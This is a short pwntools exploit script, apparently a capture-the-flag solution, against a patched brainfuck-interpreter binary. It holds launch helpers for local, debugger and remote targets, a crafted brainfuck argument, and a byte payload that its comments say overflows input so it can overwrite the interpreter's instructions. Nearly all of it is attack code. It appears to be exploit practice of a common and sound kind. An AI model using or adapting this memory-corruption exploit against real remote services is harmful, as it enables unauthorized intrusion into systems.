from pwn import *

exe = ELF("./bf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

'''
canary at main
putchar
getchar
'''

gdbscript = '''
brva 0x150B
brva 0x1A86
brva 0x1AB5
init-pwndbg
continue
'''.format(**locals())

exe = './bf_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

argu = '>,[[>],[<]>-]-[>]-[<.+]++++++++++.'
p = start([argu])

payload = p8(0x7e + 7) # number of input (vuln) can overwrite ins
payload += p8(3) * 0x7e # padding
payload += p8(0xff) * 6 # '>,'
payload += p8(0xff) * 2 # [

p.send(payload)

p.interactive()